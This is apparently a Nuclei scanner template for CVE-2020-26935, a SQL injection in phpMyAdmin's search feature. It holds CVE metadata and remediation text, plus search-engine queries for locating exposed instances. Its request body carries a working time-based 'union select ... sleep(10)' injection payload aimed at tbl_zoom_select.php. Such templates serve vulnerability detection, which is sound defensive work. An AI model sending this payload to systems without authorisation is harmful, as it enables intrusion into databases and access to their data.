id: CVE-2020-26935

info:
  name: SQL Injection in phpMyAdmin Search Feature
  author: ProjectDiscoveryAI
  severity: critical
  description: An issue was discovered in SearchController in phpMyAdmin before 4.9.6 and 5.x before 5.0.3. A SQL injection vulnerability was discovered in how phpMyAdmin processes SQL statements in the search feature.
  impact: |
    Allows attackers to execute malicious SQL queries and potentially access or modify sensitive data
  remediation: |
    Update phpMyAdmin to the latest version to patch the SQL Injection vulnerability
  reference:
    - http://lists.opensuse.org/opensuse-security-announce/2020-10/msg00027.html
    - http://lists.opensuse.org/opensuse-security-announce/2020-11/msg00005.html
    - https://lists.debian.org/debian-lts-announce/2020/10/msg00024.html
    - https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/FHST4E5IJG7IKZTTW3R6MEZPVHJZ472K/
    - https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/PXK37YEHSDYCIPQSYEMN2OFTP2ZLM7DO/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-26935
    cwe-id: CWE-89
    epss-score: 0.00817
    epss-percentile: 0.82483
    cpe: cpe:2.3:a:phpmyadmin:phpmyadmin:*:*:*:*:*:*:*:*
  metadata:
    vendor: phpmyadmin
    product: phpmyadmin
    shodan-query: http.title:phpMyAdmin
    fofa-query: body="pma_servername" && body="4.8.4"
    google-query: intitle:"phpmyadmin"
    hunter-query: app.name="phpmyadmin"&&web.body="pma_servername"&&web.body="4.8.4"

http:
  - method: POST
    path:
      - "{{BaseURL}}/tbl_zoom_select.php"

    body: |
      db=test&table=test_table&token=7f6f64702a2b623d583f772848777a35&get_data_row=true&where_clause=1+union+select+1,+1,+sleep(10)

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: dsl
        dsl:
          - "duration>=5"
